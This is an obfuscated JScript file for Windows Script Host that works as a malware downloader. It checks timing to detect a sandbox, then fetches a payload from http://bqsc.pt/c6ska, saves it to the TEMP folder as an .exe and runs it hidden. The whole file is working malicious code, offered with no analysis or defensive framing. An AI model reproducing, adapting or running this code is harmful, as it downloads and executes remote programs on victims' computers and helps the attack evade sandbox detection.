var _SY = false;
var _FK = "CreateObject";
var _YR = function _O() {return WScript[_FK]("WScript"+".Shell");}(), _C = 11;
var _NJ = "MSXML2.XMLHTTP";
var _NV = 2123213;
var _W = 0;
function _XC(_F0){_YR["Run"](_F0, _W, _W);};
function _JO(){return _NJ + "";};
function _A(_L, _ZR){_W = _W * 1; return _L - _ZR;};
function _K(){return _FK;};
/*@cc_on
  @if (@_win32 || @_win64)
    _SY = true;
  @end
@*/
if (_SY)
{
var _I = "";
function _R(){return 22;};
var _YX = 0; var _H = 0;
function _N()
{
var _MV = new this["Date"]();
var _VY = _MV["getUTCMilliseconds"]();
WScript["Sleep"](_R());
var _MV = new this["Date"]();
var _A0 = _MV["getUTCMilliseconds"]();
WScript["Sleep"](_R());
var _MV = new this["Date"]();
var _G = _MV["getUTCMilliseconds"]();
var _YX = "_ZA";
_YX = _A(_A0, _VY);
var _H = "_BS";
_H = _A(_G, _A0);
_I = "open";
return _A(_YX, _H);
}
var _VA = false;
var _J = false;
for (var _E = _W; _E < _R() * 1; _E++){if (_N() != _W){
_VA = true; 
_H = "31" + 11 * _YX + _H; 
_J = true; 
break;
}}
function _KL() {return ((_VA == true) && (_VA == _J)) ? 1 : _W;};
if (_VA && _KL() && _J){
function _U() {return _YR["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "oQGcIpGpE.ex" + "e";};
 _G0 = _JO();
 _WP = WScript[_FK](_G0);
 var _U0 = 1;
 while (_U0){
try {
	if (_U0 == 1)
	{
		_WP[_I]("GET", "http://bqsc.pt/c6ska", false);
		_WP["send"]();
		_CS = "Sleep";
	}
	WScript[_CS](_R() + 120); 
	if (_WP["readystate"] < 2 * 2) continue;
	_U0 = _W;
	function _XQ(_F) {var _K0 = (1, 2, 3, 4, 5, _F); return _K0;};
	_I0 = WScript[_K()]("ADODB.Stream");
	_G0 = _I0;
	_G0[_I]();
	_G0["type"] = _XQ(1);
	_G0["write"](_WP["ResponseBody"]);
	_I0["position"] = _XQ(_W);
	_G0["Save" + "ToFile"](_U(), 2);
	_I0["cl"+"ose"]();
	_X = _U();
	_XC(_X);
} catch(_M){};
}
}
}

